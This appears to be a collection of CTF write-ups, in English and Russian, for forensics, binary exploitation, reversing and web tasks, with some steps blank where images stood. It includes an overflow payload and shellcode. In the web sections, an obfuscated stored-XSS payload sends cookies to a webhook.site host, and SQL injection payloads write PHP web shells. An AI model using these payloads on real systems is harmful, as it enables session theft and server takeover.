@@ -1,0 +1,352 @@
+Apache Cassandra (Forensics)
+
+1. First of all, we need to scan site with dirb:
+
+2.
+
+3. We found backup. Let us try to access:
+
+4.
+
+5. If we try to bruteforce various combinations of htpasswd and htaccess backup files, we
+could find file called htpasswd.bak:
+
+6. admin:$apr1$a1c9rfu7$Obbf8z3MYb.hpZ0FdxqKW.
+
+7. Time to bruteforce password using rockyou.txt:
+
+8.
+
+9. So we can download backup file from server with credentials: admin:cassandra:
+
+10.
+
+11. Time to unpack Squashfs:
+
+12.
+
+13. And obtain the flag:
+
+14. CTF{D474BA535_0R_07H3r_cR3dZ_5h0UlDn7_B3_h3r3}
+
+Think like Socrates (Forensics)
+
+1. We have pcapng capture file. Let us analyze it with Wireshark:
+
+2.
+
+3. Someone download flag.7z from local server. Let us analyze it:
+
+4.
+
+5. File has .7z extension, but file program says that header is different…
+
+6. Let us simply fix the header:
+
+7.
+
+8. Same for .jpg image:
+
+9.
+
+10. In the image we see an image of a Greek philosopher Socrates who points to a line.
+
+11.
+
+12. We can try different polyalphabetic ciphers, and find that it is Affine cipher.
+
+13.
+
+14. And obtain the flag: CTF{L34rn_H1570Ry_r34LlY}
+
+TrueNotEncrypt (Forensics)
+
+1. First of all, we need to unpack archive with unxz.
+
+2. We need to analyze disk image. Let us use testdisk:
+
+3.
+
+4. We can recover files:
+
+5.
+
+6. First file seems like a random data. But second file is simple ASCII text.
+
+7. If we remain task name, we could try to open file run.exe with a password from text
+file.
+
+8. And we open hidden TrueCrypt container:
+
+9.
+
+10. And we get flag from image file:
+
+11. CTF{f0r3n51c5_15_4lW4y5_4_107_0f_1n7u1710n_4Nd_4_107_0f_3xp3r13nc3}
+
+Stringer (Binary Exploitation)
+
+Overflowing a string field in a String structure overwrites the print function pointer.
+Payload:
+p = b'A'*132 + b'\x73\x13\x40\x00\x00\x00\x00' # 0x401373
+
+CTF{_345Y_pwn_c00l__0W3RFLOw_}
+
+Shellcoding (Binary Exploitation)
+
+First, write the shellcode to dump the binary.
+mov rax, 1
+mov rdi, 1
+mov rsi, 0x400000
+mov rdx, 0x4000
+syscall
+
+After static analysis, we see that the file flag.txt has been opened.
+If we know the fd of an open file, we can read its contents.
+We can write a simple shell that bruteforces fd.
+mov r15, 3
+loop:
+mov rax, 0
+mov rdi, r15
+mov rsi, 0x404300
+mov rdx, 100
+syscall
+mov rax, 1
+mov rdi, 1
+mov rsi, 0x404300
+mov rdx, 100
+syscall
+inc r15
+cmp r15, 10
+jle loop
+ret
+
+CTF{_noT_50_H4rD_sH3Llcode_}
+
+Strange number (Crypto)
+
+Tupper formula.
+https://tuppers-formula.ovh/
+
+FLAG: CTF{TUpp3R_CRupt0}
+
+ProRev (Reverse Engineering)
+
+#!/usr/bin/env python3
+import math
+import random
+def lcm(a, b):
+return abs(a*b) // math.gcd(a, b)
+def factorize(n):
+d = []
+m = '{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
+for t in m:
+i = ord(t)
+if n % i == 0:
+d.append(i)
+return d
+flag = "CTF{FINALLY_Y0u_gOt_7h3_EpiLogu3}"
+assert(len(flag) == 33)
+l = []
+f = [ord(i) for i in flag]
+for i in range(len(f)-1):
+l.append(lcm(f[i],f[i+1]))
+xors = [5556, 404, 8677, 8647, 4996, 5729, 509, 4990, 0, 6710, 8558, 8574, 4301, 1854,
+11039, 9730, 8086, 9206, 11124, 1139, 5738, 5313, 4746, 6568, 7689, 1730, 8027, 8372,
+11475, 12066, 1951, 6360]
+for i in range(len(l)):
+l[i] ^= xors[i]
+tmpa = [chr(i) for i in l]
+print('Encrypted: ',tmpa,'\n',l)
+print()
+for i in range(len(l)):
+l[i] ^= xors[i]
+variants = [factorize(i) for i in l]
+o = [[ord('C')]]
+for i in range(len(variants)):
+tmp = []
+for j in variants[i]:
+for k in o[i]:
+if lcm(j, k) == l[i] and j not in tmp:
+tmp.append(j)
+o.append(tmp)
+print('Decrypted variants:')
+for i in o:
+tmp = []
+for j in i:
+tmp.append(chr(j))
+print(tmp)
+
+Флаг CTF{FINALLY_Y0u_gOt_7h3_EpiLogu3}
+
+Waves (Reverse Engineering)
+
+• Open the executable in some disassembler, see that it writes some encrypted message
+(flag) in the audio file
+
+• Flag is encrypted using 3DES algorithm, we know all keys (they are similar). After that it
+is written by some offsets in audio file samples using different channels
+
+• We should write decryptor for the file:
+
+#include <iostream>
+#include "AudioFile.h"
+#include <openssl/des.h>
+#include <cstring>
+#include <cstdlib>
+#include <cmath>
+using namespace std;
+AudioFile<double> audioFile;
+
+DES_cblock Key1 = { 0xAD, 0xAE, 0xAE, 0xAE, 0xAD, 0xAE, 0xAE, 0xAE };
+
+DES_cblock Key2 = { 0xAD, 0xAE, 0xAE, 0xAE, 0xAD, 0xAE, 0xAE, 0xAE };
+
+DES_cblock Key3 = { 0xAD, 0xAE, 0xAE, 0xAE, 0xAD, 0xAE, 0xAE, 0xAE };
+DES_key_schedule SchKey1,SchKey2,SchKey3;
+DES_cblock cblock = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+int main(int argc, char *argv[]){
+if (argc != 2) {
+cout << "Usage:\n./decrypt <input file>" << endl;
+return 0;
+
+}
+audioFile.load(argv[1]);
+int numChannels = audioFile.getNumChannels();
+int channel = 0;
+int numSamples = audioFile.getNumSamplesPerChannel();
+int c = 0;
+char* cipher(new char[32]);
+memset(cipher,0,32);
+for (int i = 1337; i < numSamples; i += 0xb33f)
+{
+if (c == 32)
+break;
+double tmp = audioFile.samples[channel][i];
+cipher[c] = (unsigned char)(round(tmp * 1000));
+c++;
+channel = (channel + 1) % numChannels;
+
+}
+cout << endl;
+char* text(new char[32]);
+memset(text,0,32);
+DES_set_odd_parity(&cblock);
+if (DES_set_key_checked(&Key1, &SchKey1) || DES_set_key_checked(&Key2, &SchKey2) ||
+
+DES_set_key_checked(&Key3, &SchKey3)) {
+printf("Key error, exiting ....\n");
+return 1;
+
+}
+memset(cblock,0,sizeof(DES_cblock));
+DES_set_odd_parity(&cblock);
+
+DES_ede3_cbc_encrypt((const unsigned char*)cipher,
+
+(unsigned char*)text,
+32, &SchKey1, &SchKey2, &SchKey3,
+
+&cblock,DES_DECRYPT);
+printf("Decrypted : %s\n",text);
+return 0;
+
+}
+
+Флаг CTF{R3vPlU5St3g0L0ve}
+
+InnoLang (PPC)
+
+Ответ: CTF{345y_pr06_l4n6}
+
+Решение: Стандартная пародия на брейнфак. Самое простое решение - перевести все
+функции в брейнфак и интерпретировать его на любом онлайн ресурсе.
+
+NeuroBrain (PPC)
+
+Ответ: CTF{br41nfuck_m3_m0r3}
+
+Решение: Сервис генерировал случайное слово и в ответ ждал это же слово, но на языке
+brainfuck. Пишем простую программу преобразующую слова в brainfuck-подобный вид и
+вешаем это на сокеты, после 200 раундов получаем флаг.
+
+NoSecurity (Web)
+
+Ответ: CTF{sUch_4_U53fuLL_Fl4w_f0R_Hackers}
+
+• Try to get /admin - there is redirect to http://admin-panel:8080/admin, it seems to be
+the local address
+
+• On the main page we see a field to enter the link to the passwords file
+
+• Try to enter http://admin-panel:8080/admin, follow the link and get the flag
+
+Don’t panic (Web)
+
+Ответ: CTF{go_Go_G00oo0ol4nG}
+
+• Scan dirs, find /.git
+
+• Dump it using git-dumper, for example
+
+• Find secret.go and get url /nobodyknowsiamhere with the flag
+
+Faster (Web)
+
+Ответ: CTF{simple_race_condition}
+
+Решение: В сервисе была заложена уязвимость вида race condition, участники могли
+сделать асинхронный запрос на страницу /free и получить более 500 бонусов, вместо
+положенных 50. Пример эксплоита:
+
+Zen (Web)
+
+Ответ: CTF{4nd_7h3_c10ck_15_71ck1n9}
+
+Решение: Уязвимость класса Blind SQLi, один из вариантов решения - использовать
+функции задержки для подбора нужного символа. Можно решить через sqlmap или с
+помощью подобного кода:
+
+Misconfig (Web)
+
+Ответ: CTF{n91nx_41145_724v32541_c4n_h31p_m3_234d_f149}
+
+Решение: Nginx path alias traversal. Был дан хинт по адресу /static/hint.txt, можно было
+получить флаг следующим способом:
+
+Storage (Web)
+
+Ответ: CTF{very_bad_admin}
+
+Решение: Stored XSS bypass. Сервис искал в ссылке левые сайты и айпи адреса, можно
+было забайпассить следующим образом:
+
+```javascript=
+
+<script>eval(String['fromCharCode'](102, 101, 116, 99, 104, 40, 39, 104, 116, 116, 112, 115, 58,
+47, 47, 119, 101, 98, 104, 111, 111, 107, 46, 115, 105, 116, 101, 47, 97, 99, 51, 53, 102, 51, 102,
+56, 45, 56, 50, 98, 98, 45, 52, 99, 57, 50, 45, 98, 52, 56, 102, 45, 51, 52, 101, 52, 98, 56, 50, 53,
+102, 99, 56, 98, 63, 99, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 39, 99, 111,
+111, 107, 105, 101, 39, 93, 41))</script>
+
+```
+
+После сохранения такой заметки - отправляем ссылку админу и забираем флаг из куки.
+
+Simple Logic (Web)
+
+Ответ: CTF{attach_db_as_php}
+
+Решение: Подключение php файла как файл базы данных через SQLi.
+
+Пример запроса:
+
+```php=
+
+ATTACH DATABASE '/var/www/html/lol.php' AS lol;CREATE TABLE lol.pwn (dataz text); INSERT
+INTO lol.pwn (dataz) VALUES ('<? shell_exec("whoami"); ?>');--
+
+');ATTACH DATABASE '/var/www/html/lol1.php' AS lol1;CREATE TABLE lol1.pwn1 (dataz text);
+INSERT INTO lol1.pwn1 (dataz) VALUES ('<?php echo exec("/bin/bash -c 'id'");; ?>');--
+
+```
